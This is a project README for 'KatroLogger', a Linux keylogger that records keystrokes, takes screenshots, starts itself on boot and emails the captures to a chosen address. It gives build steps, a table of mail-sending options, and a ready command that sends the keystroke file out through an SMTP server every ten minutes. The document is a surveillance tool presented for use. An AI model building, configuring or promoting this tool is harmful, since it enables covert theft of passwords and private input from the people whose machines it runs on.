<h1 align="center">KatroLogger</h1>
<h4 align="center"><code>KeyLogger for Linux Systems</code></h4>

<p align="center">
  <a href="https://github.com/Katrovisch/KatroLogger">
    <img src="https://github.com/Katrovisch/KatroLogger/blob/master/static/img/keylogger.png">
  </a>
</p>

- **Features**
  - Runs on GUI systems or CLI
  - Sending data by email
  - Autorun on boot
  - Screenshots

- **Dependencies**
  - [libquickmail](https://sourceforge.net/projects/libquickmail/)
```
wget https://ufpr.dl.sourceforge.net/project/libquickmail/libquickmail-0.1.29.tar.xz
tar -xvf libquickmail-0.1.29.tar.xz
./autogen.sh && ./configure && make && make install
```

- **Compiling**
```Shell
./configure
make
make install
```
- **Usage**
```Shell
katrologger --output /path/file
```
### Send data by e-mail

| Argument | Description | 
|---|---|
| --smtp-status | status of sending email service |
| --smtps-url | SMTPS server |
| --smtp-url | SMTP server |
| --port | SMTP port|
| --mail-from | source email |
| --mail-rcpt | receipt email |
| --pass | password email |
| --smtp-file | attach key capture file for sending |
| --time | time interval for sending, ex: --time 1-60 (minutes) |
| --screen | screenshot, ex: --screen :0 (display) |

</br>

```Shell
katrologger --smtps-url smtp.gmail.com --port 465 --mail-from <address> --mail-rcpt <address> --pass <password> --smtp-file /path/keyscan --time 10
```

- **Uninstall**
```Shell
make uninstall
```

- **License**

KatroLogger is licensed under the [GNU General Public License v3.0](https://github.com/Katrovisch/KatroLogger/blob/master/LICENSE)
